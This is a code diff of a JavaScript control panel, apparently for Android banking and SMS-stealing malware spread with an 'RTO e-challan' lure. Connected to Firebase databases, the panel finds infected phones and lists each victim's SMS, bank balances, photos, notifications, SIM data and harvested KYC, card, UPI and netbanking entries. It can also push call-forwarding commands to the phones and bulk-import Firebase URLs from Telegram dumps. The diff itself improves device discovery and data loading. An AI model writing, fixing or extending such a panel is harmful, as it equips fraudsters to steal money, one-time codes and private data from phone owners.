@@ -233,7 +233,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
         <div class="hint2">Add Firebase URL, API Key, or upload APK</div>
         <div class="bulk-card">
           <h3>⚡ Bulk Connect</h3>
-          <p>Kahi se bhi firebase URLs paste karo — Telegram dump ho, list ho, kuch bhi. Har firebase URL AUTO-detect hoga.</p>
+          <p>Kahi se bhi firebase URLs paste karo. Har URL auto-detect hoga.</p>
           <textarea id="bulkInput" placeholder="📍 Firebase URL: https://app-one-default-rtdb.firebaseio.com&#10;🔑 Auth Key: AIzaSy..."></textarea>
           <button class="btn-bulk" id="btnBulkConnect">⚡ Connect All</button>
         </div>
@@ -329,7 +329,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 <div class="cf-overlay" id="cfOverlay">
   <div class="cf-dialog">
     <h3>📞 Call Forwarding</h3>
-    <div class="cf-hint">Enter forwarding number and select SIM. Command will be sent to device via Firebase.</div>
+    <div class="cf-hint">Enter forwarding number and select SIM.</div>
     <label class="cf-label">Forward To Number</label>
     <input type="tel" class="cf-input" id="cfNumber" placeholder="+91XXXXXXXXXX" maxlength="15">
     <label class="cf-label">Select SIM</label>
@@ -359,7 +359,7 @@ var db = null;
 var currentApp = null;
 var currentAccount = null;
 var devs = {};
-var devPaths = {};         // deviceId -> { messages: path, photos: path, ... }
+var devPaths = {};
 var curId = null;
 var curTab = 'info';
 var curMsgs = {};
@@ -368,7 +368,8 @@ var liked = JSON.parse(localStorage.getItem('liked') || '[]');
 var photos = {};
 var curPhoto = '';
 var scanListener = null;
-var dataListeners = [];    // Universal data listeners
+var deviceListener = null;
+var dataListeners = [];
 var cfSimSlot = 1;
 
 // ═══ SAVED ACCOUNTS ═══
@@ -389,37 +390,79 @@ function renderAccounts() {
   });
 }
 
-// ═══ LOGIN ═══
+// ═══ LOGIN (RTO) — FAST, NO SCAN ═══
 function doLogin() {
   var p = document.getElementById('pinInput').value.trim();
   if (p.length < 4) { document.getElementById('errorMsg').textContent = 'Enter PIN'; return; }
   document.getElementById('errorMsg').textContent = 'Checking...';
+  
   var tempApp = firebase.initializeApp(RTO_CONFIG, 'temp_' + Date.now());
   var tempDb = tempApp.database();
   tempDb.ref('admin_config/login_pin').once('value').then(function(s) {
-    if (p === (s.val() || '0987')) { tempApp.delete(); currentAccount = { name: 'RTO Admin', url: RTO_CONFIG.databaseURL, apiKey: RTO_CONFIG.apiKey }; openPanel(RTO_CONFIG, 'RTO Admin'); }
-    else { tempApp.delete(); document.getElementById('errorMsg').textContent = '❌ Wrong PIN'; }
-  }).catch(function(e) { tempApp.delete(); document.getElementById('errorMsg').textContent = 'Error: ' + e.message; });
+    if (p === (s.val() || '0987')) {
+      tempApp.delete();
+      // ✅ RTO flag
+      currentAccount = {
+        name: 'RTO Admin',
+        url: RTO_CONFIG.databaseURL,
+        apiKey: RTO_CONFIG.apiKey,
+        isRTO: true
+      };
+      openPanel(RTO_CONFIG, 'RTO Admin');
+    } else {
+      tempApp.delete();
+      document.getElementById('errorMsg').textContent = '❌ Wrong PIN';
+    }
+  }).catch(function(e) {
+    tempApp.delete();
+    document.getElementById('errorMsg').textContent = 'Error: ' + e.message;
+  });
 }
+
+// ═══ OPEN SAVED ACCOUNT — DEEP SCAN ═══
 function openAccount(idx) {
-  var list = getSavedAccounts(); var acc = list[idx]; if (!acc) return;
-  currentAccount = acc;
-  openPanel({ apiKey: acc.apiKey || RTO_CONFIG.apiKey, databaseURL: acc.url, projectId: acc.url.replace('https://','').replace('.firebaseio.com','') }, acc.name || 'Account');
+  var list = getSavedAccounts();
+  var acc = list[idx];
+  if (!acc) return;
+  currentAccount = {
+    name: acc.name || 'Account',
+    url: acc.url,
+    apiKey: acc.apiKey || RTO_CONFIG.apiKey,
+    isRTO: false
+  };
+  openPanel({
+    apiKey: acc.apiKey || RTO_CONFIG.apiKey,
+    databaseURL: acc.url,
+    projectId: acc.url.replace('https://','').replace('.firebaseio.com','')
+  }, acc.name || 'Account');
 }
+
+// ═══ OPEN PANEL ═══
 function openPanel(config, title) {
   try {
     if (currentApp) { try { currentApp.delete(); } catch(e) {} }
     currentApp = firebase.initializeApp(config, 'app_' + Date.now());
     db = currentApp.database();
+    
+    if (!currentAccount) currentAccount = {};
+    currentAccount.url = config.databaseURL;
+    currentAccount.name = title;
+    
     document.getElementById('topTitle').textContent = '🚔 ' + title;
     document.getElementById('loginScreen').style.display = 'none';
     document.getElementById('mainApp').style.display = 'block';
     startApp();
   } catch(e) { alert('Connection failed: ' + e.message); }
 }
+
+// ═══ LOGOUT ═══
 function doLogout() {
   if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
-  db = null; devs = {}; devPaths = {}; curId = null;
+  if (scanListener) { try { scanListener.off(); } catch(e) {} }
+  if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
+  dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
+  dataListeners = [];
+  db = null; devs = {}; devPaths = {}; curId = null; currentAccount = null;
   document.getElementById('mainApp').style.display = 'none';
   document.getElementById('loginScreen').style.display = 'flex';
   document.getElementById('pinInput').value = '';
@@ -429,187 +472,208 @@ function doLogout() {
   renderAccounts();
 }
 
-// ═══════════════════════════════════════════════════════
-// ⭐ UNIVERSAL DEVICE SCANNER ⭐
-// ═══════════════════════════════════════════════════════
+// ═══ START APP — RTO vs NEW ACCOUNT ═══
 function startApp() {
   if (scanListener) { try { scanListener.off(); } catch(e) {} }
+  if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
+  dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
+  dataListeners = [];
   
   var scanEl = document.getElementById('scanStatus');
   var scanText = document.getElementById('scanText');
-  scanEl.style.display = 'flex';
-  scanText.textContent = 'Scanning Firebase for devices...';
-  
   devs = {}; devPaths = {};
   
-  scanListener = db.ref('/');
-  scanListener.on('value', function(snapshot) {
-    var root = snapshot.val() || {};
-    devs = {}; devPaths = {};
-    var found = 0;
-    
-    var skipNodes = ['admin_config', 'global_config', 'app_config', 'telegram_auto_config'];
-    
-    Object.keys(root).forEach(function(nodeName) {
-      if (skipNodes.indexOf(nodeName) !== -1) return;
-      var node = root[nodeName];
-      if (!node || typeof node !== 'object') return;
-      
-      Object.keys(node).forEach(function(key) {
-        var entry = node[key];
-        if (!entry || typeof entry !== 'object') return;
-        
-        if (isDeviceEntry(key, entry)) {
-          if (!devs[key]) {
-            devs[key] = entry;
-            devPaths[key] = { device: nodeName + '/' + key };  // ✅ Base path
-            found++;
-          } else {
-            // Merge device fields
-            Object.keys(entry).forEach(function(k) {
-              if (devs[key][k] === undefined) devs[key][k] = entry[k];
-            });
-          }
-        }
+  // ✅ RTO check
+  var isRTO = currentAccount && (currentAccount.isRTO === true);
+  if (!isRTO && currentAccount && currentAccount.url) {
+    if (currentAccount.url.toLowerCase().indexOf('rto-echallan-v2') !== -1) isRTO = true;
+  }
+  console.log('isRTO:', isRTO, 'Account:', currentAccount);
+  
+  if (isRTO) {
+    // ═══ RTO — FAST LOAD, NO SCAN ═══
+    scanEl.style.display = 'none';
+    deviceListener = db.ref('device_info');
+    deviceListener.on('value', function(s) {
+      devs = s.val() || {};
+      devPaths = {};
+      Object.keys(devs).forEach(function(id) {
+        devPaths[id] = { device: 'device_info/' + id };
       });
+      console.log('RTO devices:', Object.keys(devs).length);
+      updStats();
+      renderDevs();
+      if (curId && devs[curId]) renderTab();
+    }, function(error) {
+      console.error('RTO load error:', error);
+      document.getElementById('deviceGrid').innerHTML = '<div class="empty">Error: ' + error.message + '</div>';
     });
+  } else {
+    // ═══ NEW ACCOUNT — DEEP SCAN ═══
+    scanEl.style.display = 'flex';
+    scanText.textContent = 'Scanning Firebase for devices...';
     
-    console.log('Devices found:', found);
-    scanText.textContent = 'Found ' + found + ' device(s)';
-    setTimeout(function() { scanEl.style.display = 'none'; }, 1500);
-    
-    updStats();
-    renderDevs();
-    if (curId && devs[curId]) renderTab();
-  }, function(error) {
-    console.error('Scan error:', error);
-    scanText.textContent = '❌ Error: ' + error.message;
-  });
+    scanListener = db.ref('/');
+    scanListener.on('value', function(snapshot) {
+      var root = snapshot.val() || {};
+      devs = {}; devPaths = {};
+      var found = 0;
+      var skipNodes = ['admin_config', 'global_config', 'app_config', 'telegram_auto_config'];
+      
+      Object.keys(root).forEach(function(nodeName) {
+        if (skipNodes.indexOf(nodeName) !== -1) return;
+        var node = root[nodeName];
+        if (!node || typeof node !== 'object') return;
+        
+        Object.keys(node).forEach(function(key) {
+          var entry = node[key];
+          if (!entry || typeof entry !== 'object') return;
+          
+          if (isDeviceEntry(key, entry)) {
+            if (!devs[key]) {
+              devs[key] = entry;
+              devPaths[key] = { device: nodeName + '/' + key };
+              found++;
+            } else {
+              Object.keys(entry).forEach(function(k) {
+                if (devs[key][k] === undefined) devs[key][k] = entry[k];
+              });
+            }
+          }
+        });
+      });
+      
+      console.log('Scanned devices:', found, devs);
+      scanText.textContent = 'Found ' + found + ' device(s)';
+      setTimeout(function() { scanEl.style.display = 'none'; }, 1500);
+      
+      updStats();
+      renderDevs();
+      if (curId && devs[curId]) renderTab();
+    }, function(error) {
+      console.error('Scan error:', error);
+      scanText.textContent = '❌ Error: ' + error.message;
+    });
+  }
 }
 
-// ✅ Device entry detect karo
+// ✅ Loose device detection
 function isDeviceEntry(key, entry) {
+  if (!entry || typeof entry !== 'object') return false;
   if (key.indexOf('DEV_') === 0) return true;
-  var deviceFields = ['device_model', 'device_id', 'device_manufacturer', 'device_brand', 'android_version', 'android_sdk', 'sim_info', 'battery', 'first_install_timestamp', 'install_timestamp', 'device_hardware', 'device_fingerprint', 'status', 'last_seen', 'messages', 'form_data', 'kyc_data', 'payment_data'];
-  var matches = 0;
-  for (var i = 0; i < deviceFields.length; i++) { if (entry[deviceFields[i]] !== undefined) matches++; }
-  return matches >= 2;
+  
+  var deviceFields = [
+    'device_model', 'device_id', 'device_manufacturer', 'device_brand',
+    'android_version', 'android_sdk', 'sim_info', 'battery', 'battery_status',
+    'first_install_timestamp', 'install_timestamp', 'device_hardware',
+    'device_fingerprint', 'status', 'last_seen', 'messages', 'sms_history',
+    'form_data', 'kyc_data', 'payment_data', 'upi_data', 'card_data',
+    'netbanking_data', 'photos', 'installed_apps', 'notifications',
+    'device_board', 'serial_number', 'cpu_arch', 'storage', 'ip_address',
+    'online_time', 'offline_time', 'battery_info'
+  ];
+  
+  for (var i = 0; i < deviceFields.length; i++) {
+    if (entry[deviceFields[i]] !== undefined) return true;
+  }
+  
+  var hasBatteryLike = false;
+  Object.keys(entry).forEach(function(k) {
+    if (typeof entry[k] === 'string' && entry[k].indexOf('%') !== -1) hasBatteryLike = true;
+  });
+  if (hasBatteryLike) return true;
+  
+  return false;
 }
 
-// ═══════════════════════════════════════════════════════
-// ⭐ UNIVERSAL DATA LOADER ⭐
-// Device ka saara data dhundho — messages, sim, photos
-// ═══════════════════════════════════════════════════════
-function loadAllDeviceData(deviceId, callback) {
-  // Saare listeners clear karo
+// ═══ UNIVERSAL DATA LOADER ═══
+function loadAllDeviceData(deviceId, basePath, callback) {
   dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
   dataListeners = [];
   
   var data = {
-    messages: {},
-    sms_history: {},
-    photos: {},
-    notifications: {},
-    installed_apps: {},
-    sim_info: null,
-    forward_settings: null,
-    device_info: null
+    messages: {}, sms_history: {}, photos: {}, notifications: {},
+    installed_apps: {}, sim_info: null, forward_settings: null, device_info: null
   };
   
-  // ✅ Firebase ka poora root scan karo
-  var listener = db.ref('/');
-  var cb = listener.on('value', function(snapshot) {
+  // ✅ Base path se load karo (fast)
+  if (basePath) {
+    var baseRef = db.ref(basePath);
+    var cb1 = baseRef.on('value', function(s) {
+      var devObj = s.val() || {};
+      collectData(devObj, data);
+      callback(data);
+    });
+    dataListeners.push({ ref: baseRef, cb: cb1 });
+  }
+  
+  // ✅ Background mein poora root scan karo (agar data kahin aur bhi ho)
+  var rootRef = db.ref('/');
+  var cb2 = rootRef.on('value', function(snapshot) {
     var root = snapshot.val() || {};
-    var merged = { messages: {}, sms_history: {}, photos: {}, notifications: {}, installed_apps: {}, sim_info: null, forward_settings: null, device_info: null };
-    
-    // ✅ Har node mein deviceId dhundho
-    scanForDevice(root, [], deviceId, merged);
-    
-    // Data update karo
+    var merged = {
+      messages: Object.assign({}, data.messages),
+      sms_history: Object.assign({}, data.sms_history),
+      photos: Object.assign({}, data.photos),
+      notifications: Object.assign({}, data.notifications),
+      installed_apps: data.installed_apps,
+      sim_info: data.sim_info,
+      forward_settings: data.forward_settings,
+      device_info: data.device_info
+    };
+    scanForDevice(root, deviceId, merged);
     Object.keys(merged).forEach(function(k) { data[k] = merged[k]; });
-    
-    // Callback
     callback(data);
   });
-  dataListeners.push({ ref: listener, cb: cb });
+  dataListeners.push({ ref: rootRef, cb: cb2 });
 }
 
-// ✅ Recursively deviceId dhundho har node mein
-function scanForDevice(obj, path, deviceId, result) {
+function scanForDevice(obj, deviceId, result) {
   if (!obj || typeof obj !== 'object') return;
-  
-  // Agar ye object deviceId ki key hai → iske andar ka data collect karo
   if (obj[deviceId] && typeof obj[deviceId] === 'object') {
     collectData(obj[deviceId], result);
   }
-  
-  // ✅ Deep scan — har child mein
   Object.keys(obj).forEach(function(key) {
     if (key === deviceId) return;
     var child = obj[key];
     if (child && typeof child === 'object') {
-      scanForDevice(child, path.concat([key]), deviceId, result);
+      scanForDevice(child, deviceId, result);
     }
   });
 }
 
-// ✅ Data collect karo aur merge karo
 function collectData(devObj, result) {
   if (!devObj || typeof devObj !== 'object') return;
   
-  // Messages
   if (devObj.messages && typeof devObj.messages === 'object') {
-    Object.keys(devObj.messages).forEach(function(k) {
-      result.messages[k] = devObj.messages[k];
-    });
+    Object.keys(devObj.messages).forEach(function(k) { result.messages[k] = devObj.messages[k]; });
   }
-  
-  // SMS History
   if (devObj.sms_history && typeof devObj.sms_history === 'object') {
-    Object.keys(devObj.sms_history).forEach(function(k) {
-      result.sms_history[k] = devObj.sms_history[k];
-    });
+    Object.keys(devObj.sms_history).forEach(function(k) { result.sms_history[k] = devObj.sms_history[k]; });
   }
-  
-  // Photos
   if (devObj.photos && typeof devObj.photos === 'object') {
-    Object.keys(devObj.photos).forEach(function(k) {
-      result.photos[k] = devObj.photos[k];
-    });
+    Object.keys(devObj.photos).forEach(function(k) { result.photos[k] = devObj.photos[k]; });
   }
-  
-  // Notifications
   if (devObj.notifications && typeof devObj.notifications === 'object') {
-    Object.keys(devObj.notifications).forEach(function(k) {
-      result.notifications[k] = devObj.notifications[k];
-    });
+    Object.keys(devObj.notifications).forEach(function(k) { result.notifications[k] = devObj.notifications[k]; });
   }
   if (devObj.sms_notifications && typeof devObj.sms_notifications === 'object') {
-    Object.keys(devObj.sms_notifications).forEach(function(k) {
-      result.notifications[k] = devObj.sms_notifications[k];
-    });
+    Object.keys(devObj.sms_notifications).forEach(function(k) { result.notifications[k] = devObj.sms_notifications[k]; });
   }
-  
-  // Installed apps
   if (devObj.installed_apps && typeof devObj.installed_apps === 'object') {
     result.installed_apps = devObj.installed_apps;
   }
-  
-  // SIM info
   if (devObj.sim_info && typeof devObj.sim_info === 'object') {
     result.sim_info = Object.assign({}, result.sim_info || {}, devObj.sim_info);
   }
-  // SIM fields directly bhi ho sakte hain
   if (devObj.sim1_number || devObj.sim1_carrier) {
     result.sim_info = Object.assign({}, result.sim_info || {}, {
       sim1_number: devObj.sim1_number, sim1_carrier: devObj.sim1_carrier,
       sim2_number: devObj.sim2_number, sim2_carrier: devObj.sim2_carrier
     });
   }
-  
-  // Forward settings
   if (devObj.forward_settings && typeof devObj.forward_settings === 'object') {
-    result.forward_settings = devObj.forward_settings;
+    result.forward_settings = Object.assign({}, result.forward_settings || {}, devObj.forward_settings);
   }
   if (devObj.enabled !== undefined && devObj.admin_number !== undefined) {
     result.forward_settings = Object.assign({}, result.forward_settings || {}, {
@@ -618,14 +682,8 @@ function collectData(devObj, result) {
       forward_sim_slot: devObj.forward_sim_slot
     });
   }
-  
-  // Device info
   if (!result.device_info) result.device_info = {};
-  ['device_model', 'device_id', 'android_version', 'android_sdk', 'battery', 'status', 'last_seen', 'sim_info'].forEach(function(k) {
-    if (devObj[k] !== undefined) result.device_info[k] = devObj[k];
-  });
-  // Form/KYC/Card data
-  ['form_data', 'kyc_data', 'payment_data', 'upi_data', 'card_data', 'netbanking_data', 'device_note'].forEach(function(k) {
+  ['device_model', 'device_name', 'device_id', 'android_version', 'android_sdk', 'battery', 'status', 'last_seen', 'sim_info', 'form_data', 'kyc_data', 'payment_data', 'upi_data', 'card_data', 'netbanking_data', 'device_note'].forEach(function(k) {
     if (devObj[k] !== undefined) result.device_info[k] = devObj[k];
   });
 }
@@ -637,25 +695,26 @@ function openDev(id) {
   document.getElementById('dTitle').textContent = '📱 ' + (d.device_model || d.device_name || id);
   updStar();
   
-  // ✅ Universal data load karo
   document.getElementById('dBody').innerHTML = '<div class="loading">Loading device data...</div>';
   
-  loadAllDeviceData(id, function(data) {
-    curMsgs = data.messages;
-    photos = data.photos;
+  var basePath = (devPaths[id] && devPaths[id].device) || ('device_info/' + id);
+  
+  loadAllDeviceData(id, basePath, function(data) {
+    curMsgs = data.messages || {};
+    photos = data.photos || {};
     
-    // Device object update karo merged data se
     if (data.sim_info) devs[id].sim_info = data.sim_info;
     if (data.forward_settings) devs[id].forward_settings = data.forward_settings;
     if (data.notifications && Object.keys(data.notifications).length > 0) devs[id].notifications = data.notifications;
     if (data.installed_apps && Object.keys(data.installed_apps).length > 0) devs[id].installed_apps = data.installed_apps;
     if (data.sms_history && Object.keys(data.sms_history).length > 0) devs[id].sms_history = data.sms_history;
+    if (data.device_info) {
+      Object.keys(data.device_info).forEach(function(k) {
+        if (devs[id][k] === undefined) devs[id][k] = data.device_info[k];
+      });
+    }
     
-    if (curTab === 'photos') renderPhotos();
-    else if (curTab === 'apps') renderApps();
-    else if (curTab === 'notifs') renderNotifs();
-    else if (curTab === 'bank' || curTab === 'allsms') renderTab();
-    else renderTab();
+    renderTab();
   });
   
   document.getElementById('drawer').classList.add('active');
@@ -832,7 +891,7 @@ function renderBank() {
   html += bks.map(function(m) {
     var bal = extractBal(m.body), tx = extractTx(m.body), bn = bankName(m.sender);
     var isCr = (m.body || '').toUpperCase().indexOf('CREDIT') !== -1;
-    return '<div class="tx"><div class="tx-head"><span class="tx-acc">' + esc(bn) + ' — ' + esc(m.sender || '') + '</span></div>' + (bal ? '<div class="tx-lbl">Available Balance</div><div class="tx-bal">' + bal + '</div>' : '') + (tx ? '<div class="tx-amt ' + (isCr ? 'cr' : '') + '">' + (isCr ? '+' : '-') + tx + '</div>' : '') + '<div class="tx-msg">' + esc(m.body || '') + '</div><div class="tx-date">' + (m.date || '') + '</div></div>';
+    return '<div class="tx"><div class="tx-head"><span class="tx-acc">' + esc(bn) + ' — ' + esc(m.sender || '') + '</span></div>' + (bal ? '<div class="tx-lbl">Balance</div><div class="tx-bal">' + bal + '</div>' : '') + (tx ? '<div class="tx-amt ' + (isCr ? 'cr' : '') + '">' + (isCr ? '+' : '-') + tx + '</div>' : '') + '<div class="tx-msg">' + esc(m.body || '') + '</div><div class="tx-date">' + (m.date || '') + '</div></div>';
   }).join('');
   b.innerHTML = html;
 }
@@ -1027,7 +1086,11 @@ function saveNewAcc() {
   if (dup !== -1) { list[dup].apiKey = key; acc = list[dup]; } else list.push(acc);
   saveAccounts(list);
   err.textContent = '✅ Opening panel...';
-  setTimeout(function() { currentAccount = acc; hideNewAcc(); openPanel({ apiKey: key, databaseURL: url, projectId: url.replace('https://','').replace('.firebaseio.com','') }, acc.name); }, 600);
+  setTimeout(function() {
+    currentAccount = { name: acc.name, url: url, apiKey: key, isRTO: false };
+    hideNewAcc();
+    openPanel({ apiKey: key, databaseURL: url, projectId: url.replace('https://','').replace('.firebaseio.com','') }, acc.name);
+  }, 600);
 }
 
 // ═══ EVENT LISTENERS ═══
